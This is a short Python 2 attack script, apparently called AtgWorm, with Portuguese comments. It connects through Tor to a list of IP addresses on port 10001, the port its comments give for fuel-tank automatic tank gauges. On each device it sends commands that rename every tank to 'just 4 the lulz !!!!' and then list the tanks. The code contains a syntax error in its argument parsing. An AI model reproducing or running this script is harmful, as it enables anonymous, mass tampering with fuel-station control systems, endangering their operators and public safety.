# -*- enconding: utf-8 -*-

"""
	by @ozym4ndias @Risezin at telegram
paper que inspirou script: https://telegra.ph/Hackeando-tanques-de-combust%C3%ADvelATG-02-03

V2.0
"""
from pwn import *
from time import sleep
import sys

# help option
if sys.argv[1] == "-h":
	print "Modo de uso:\nVoce deve passar como parametro um arquivo .txt contendo os ip's que o script ira usar, exemplo: $ python AtgWorm.py -f alvos.txt\n\n"
	exit()
elif sys.argv.[1] == "-f":
	arquivo = open(sys.argv[2])
	ips = arquivo.readlines()
	
# usa proxy do tor durante as conexoes
context.proxy = (socks.SOCKS5, 'localhost', 9050)

# Verificando se o funcionamento do proxy esta OK
wg = wget('https://ipinfo.io/ip')

if wg is None:
  exit()

print "your ip: {}".format(wg)
sleep(4)

# tenta conectar no ip de ipList na porta 10001(porta default do ATG)
for ip in ips:
	try:
		r = remote(ip, 10001)
		r.send('\x01'+'S60200 just 4 the lulz !!!!\r\n') # comando para mudar o nome de todos os tanques para "just 4 the lulz !!!!"
		r.send('\x01'+'I20100\r\n') # lista todos os tanques
		
		r.recvuntil(' ', drop=True)	
		response = r.recv(4029)
		print "\tresponse = {}".format(response)
		
		r.close()
	except:	# caso nao consiga se conectar no ip vai para o proximo da lista
		print "erro ao conectar ao host {}:10001".format(ip)
		pass
